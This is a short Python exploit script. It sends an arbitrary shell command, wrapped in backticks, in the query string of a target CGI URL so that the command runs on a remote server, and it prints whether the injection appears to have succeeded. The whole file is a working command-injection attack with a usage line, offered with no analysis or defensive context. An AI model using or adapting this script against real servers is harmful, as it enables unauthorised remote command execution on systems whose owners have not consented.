import requests
import sys

def exploit(cgi_url,command):
    exploit_url = '%s?`%s`' % (cgi_url,command)
    print('Executing url %s' % exploit_url) 
    res = requests.get(exploit_url)
    if res.status_code == 200:
        print('Execution seems good')
    else:
        print('Execution seems to have failed. Status: %i' % res.status_code)

if len(sys.argv) != 3:
    print('Usage: python %s http://host/cgi.pl command' % sys.argv[0])
    sys.exit(0)


exploit(sys.argv[1],sys.argv[2])